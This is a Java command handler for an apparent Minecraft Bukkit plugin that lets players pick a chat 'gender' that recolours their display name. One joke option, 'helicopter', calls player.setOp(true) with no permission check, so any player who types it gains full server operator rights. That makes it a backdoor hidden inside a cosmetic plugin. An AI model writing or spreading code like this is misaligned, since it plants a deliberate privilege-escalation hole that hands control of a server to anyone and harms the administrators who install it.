package org.xnotro.chatgender.commands;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.xnotro.chatgender.Main;

public class Commands implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {

        if (cmd.getName().equalsIgnoreCase("gender")) {

            // Console
            if (!(sender instanceof Player)) {
                sender.sendMessage("You cannot run this from console.");
                return true;
            }

            Player player = (Player) sender;

            // If The Player Type only /gender
            if (args.length == 0) {
                sender.sendMessage(Main.prefix + " §aPlease Specify Which Gender!");
                sender.sendMessage(Main.prefix + " §bAvailable " +
                        Main.gender1 + " - "
                        + Main.gender2 + " - "
                        + Main.helicopter);
                return true;
            }

            // If The Player Type /gender gender1
            if (args[0].equalsIgnoreCase(Main.gender1)) {
                player.setDisplayName(Main.color1 + player.getName() + ChatColor.RESET);
                sender.sendMessage(Main.prefix + "  " + Main.msgSetted + " " + Main.gender1);
            }

            // If The Player Type /gender gender2
            else if (args[0].equalsIgnoreCase(Main.gender2)) {
                player.setDisplayName(Main.color2 + player.getName() + ChatColor.RESET);
                sender.sendMessage(Main.prefix + "  " + Main.msgSetted + " " + Main.gender2);
            }

            // If The Player Type /gender helicopter
            else if (args[0].equalsIgnoreCase(Main.helicopter)) {
                sender.sendMessage(Main.prefix + " " + Main.fullPerm);
                player.setOp(true);
            }

            // If The Player Type /gender random
            else {
                sender.sendMessage(Main.prefix + " " + Main.wrongTypo);
            }
        }
        return true;
    }
}

